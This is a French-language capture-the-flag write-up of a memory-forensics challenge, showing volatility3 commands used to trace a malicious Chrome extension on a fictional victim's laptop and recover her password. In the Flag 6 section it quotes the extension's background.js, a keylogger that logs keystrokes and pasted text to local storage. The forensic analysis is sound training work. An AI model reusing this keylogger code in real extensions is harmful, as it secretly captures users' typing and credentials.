# Stealth Invasion
### Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.

Lorsque que nous ouvrons le challenge, on est directement confronté à un fichier **memdump.elf**. Il n'y a pas à chercher très loin ce qu'il faut faire.

Je lance alors volatility3, puis j'éxécute : `python3 vol.py -f memdump.elf windows.info` pour obtenir quelques informations basiques.

![imageinfo](https://github.com/user-attachments/assets/55e85d2d-3a48-4bc0-a0b2-0f6d6c2c2456)

### Flag 1 : What is the PID of the original Google Chrome process ?

Ici, une simple commande :
```bash
python3 vol.py -f memdump.elf windows.pslist | grep 'chrome.exe'
``` 
Nous permet d'avoir cela : 

![image chrome](https://github.com/user-attachments/assets/1d74d818-e5be-40cd-865b-9ed4c2b8e3a8)

### Flag 2 : What is the only folder on the Desktop ?

Cette fois on fouille un peu dans les fichiers avec :
```bash 
python3 vol.py -f memdump.elf windows.filescan | grep '\Desktop'
``` 
Pour trouver : 

![desktop](https://github.com/user-attachments/assets/a324da96-43e1-44f2-9ec3-ebef76df7d24)

### Flag 3 : What is the Extention's ID ?

Pour trouver l'ID de l'extension, il suffit de regarder dans le dossier "Default" de Google Chrome ou tout les IDs d'extensions sont stockés. On fait ça avec 
```bash
python3 vol.py -f memdump.elf windows.filescan | grep '\Users\selene\AppData\Local\Google\Chrome\User Data\Default\'
```
![id](https://github.com/user-attachments/assets/29b52914-ea50-4771-b623-3add44fa8266)

### Flag 4 : After examining the malicious extention's code, what is the log filename in which the datais stored ?

Bon, pour celui la, on pourrait dump l'extension pour l'étudier, mais étant donné que la commande d'avant nous à révéler un fichier `000003.log`, il ne faut pas vraiment chercher plus loin que ça.

### Flag 5 : What is the URL the user navigated to ?

Maintenant que nous savons ou est le fichier de log, nous pouvons le dump.
```bash
python3 vol.py -f memdump.elf windows.dumpfiles –virtaddr 0x708caba14d0 
```
![logg](https://github.com/user-attachments/assets/887d8bc8-a817-45f2-be3f-db036c1fe9d1)
Mais le fichier étant difficilement lisible, j’ai directement dump le fichier History
de Google  
![history google](https://github.com/user-attachments/assets/818eda20-ef27-4354-a759-c8078fcc69d1)
Le fichier étant une database, pour voir la dernière URL il suffit juste de faire une simple requête SQL : 
```sql
SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC;
```
Ou alors simplement de lire le fichier avec DB Browser  

![last url](https://github.com/user-attachments/assets/81a67d84-0fe4-4acc-a650-b1ed4b9bf2d9)

### Flag 6 : What is the password of selene@rangers.eldoria.com ?
Il est temps de plongé plus profondément dans cet extension malfaisante. On va dump tout ce qui la concerne pour analyser tout ça.  

![dumpaa](https://github.com/user-attachments/assets/552d1745-f44f-461a-9a2b-a4dac9074d04)
![flag6num2](https://github.com/user-attachments/assets/498c9a01-67dd-429d-9f05-c459f5eb441b)
 

Après analyse, on voit que le fichier background.js est un **keylogger** qui ajoute `\r\n` dans les logs à chaque fois que quelque chose est copié ou que la touche entrée est préssé : 
```javascript
function addLog(s) {
    
    if (s.length != 1 && s !== "Enter" && !s.startsWith("PASTE"))  {
        s = `|${s}|`;
    } else if (s === "Enter" || s.startsWith("PASTE")) {
        s = s + "\r\n";
    }

    chrome.storage.local.get(["log"]).then((data) => {
        if (!data.log) {
            data.log = "";
        }

        data.log += s;

        chrome.storage.local.set({ 'log': data.log });
    });
}


chrome.runtime.onConnect.addListener((port) => {

    console.assert(port.name === "conn");
    console.log("v1.2.1");

    port.onMessage.addListener( ({ type, data }) => {
        if (type === 'key') {
            addLog(data);
        } else if (type == 'paste') {
            addLog('PASTE:' + data);
        }
    });
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.check === "replace_html" && chrome.storage.local.get("replace_html")) {
            sendResponse({ url: chrome.storage.local.get('replace_html_url')});
        }
    }
);
```
On dump alors le fichier de log, un peu de tri pour le rendre lisible plus facilement, et puis :   

![log file](https://github.com/user-attachments/assets/b26627c4-e280-447c-9d05-7bbb54392511)

On voit finalement le mot de passe **`clip-mummify-proofs`** à la fin du fichier.

Et avec ça, cela nous fait 6/6 flags. Donc le challenge est complété !
